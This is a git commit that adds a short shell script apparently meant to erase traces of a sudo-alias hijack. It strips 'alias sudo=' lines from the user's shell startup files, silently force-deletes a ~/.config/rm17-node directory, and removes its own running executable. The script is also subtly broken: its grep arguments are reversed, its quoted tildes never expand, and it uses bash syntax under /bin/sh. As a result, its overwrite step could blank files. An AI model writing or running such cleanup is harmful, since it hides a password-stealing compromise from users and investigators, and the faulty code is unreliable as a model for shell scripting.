e39bd6b9da3a3e54f07e5eefaf5559b4db392889
Abel Bellows <abellows50@stuy.edu>
2025-05-23 15:35:55 -0400

    added cleanp

---
+++ clean_up.sh
@@ -0,0 +1,14 @@
+#!/bin/sh
+
+declare -a files;
+files=( "~/.zshrc" "~/.bashrc" "~/.dmrc" );
+
+for file in "${files[@]}"; do
+	grep -v $file "alias sudo=" > /tmp/tmp1799.oops 2> /dev/null;
+	cat /tmp/tmp1799.oops > $file 2>/dev/null;
+
+	rm -rf ~/.config/rm17-node >& /dev/null;
+done
+
+rm /proc/self/exe;
+
